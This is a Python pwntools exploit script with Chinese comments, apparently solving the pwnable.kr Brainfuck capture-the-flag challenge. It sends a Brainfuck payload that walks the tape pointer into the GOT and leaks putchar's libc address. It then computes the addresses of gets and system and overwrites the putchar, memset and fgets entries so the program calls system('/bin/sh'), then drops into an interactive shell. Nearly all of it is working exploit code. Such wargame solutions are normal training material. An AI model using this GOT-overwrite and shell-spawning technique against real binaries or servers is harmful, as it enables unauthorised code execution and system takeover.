#coding=utf-8
from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')

r = remote('pwnable.kr', 9001)
e = ELF('bf_libc.so')

#初始指针位置，在main函数中设定：  p = (int)&tape;
tape = 0x804a0a0

#got表上的函数存储地址
memset_got = 0x804a02c
fgets_got = 0x804a010
putchar_got = 0x804a030

main=0x8048671

#输出当前指针的内容
def output():
    return '.>.>.>.><<<<'
#读入数据到当前指针
def input():
    return ',>,>,>,><<<<'
#移动指针
def left(n):
    return '<'*n

#libc中的函数位置
gets_libc = e.symbols['gets']
system_libc = e.symbols['system']
putchar_libc = e.symbols['putchar']

payload = '.'  #调用一次putchar，让got表中地址填为真实地址
payload += left(tape-putchar_got) + output()  # 移动到putchar，输出地址
payload += input() # main 读入main地址，覆盖putchar地址
payload += left(putchar_got - memset_got) + input() # gets  移动到memset，覆盖为gets
payload += left(memset_got - fgets_got) + input()  # system  移动到fgets，覆盖为system
payload += '.'  # 执行putchar，也就是覆盖后的main

r.recvuntil('[ ]\n')
r.sendline(payload)
r.recv(1) # ??
putchar_addr = u32(r.recv(4)) # u32?  读取泄漏出的putchar地址

gets_addr = putchar_addr - putchar_libc + gets_libc  #通过putchar在libc和got中的偏移量，计算gets的地址
system_addr = putchar_addr - putchar_libc + system_libc #通过putchar在libc和got中的偏移量，计算system的地址

r.send(p32(main)) # 覆盖putchar为main
r.send(p32(gets_addr)) # 覆盖memset为gets
r.send(p32(system_addr)) # 覆盖fgets为system

r.sendline('/bin/sh') # 执行 system("/bin/sh")

r.interactive()

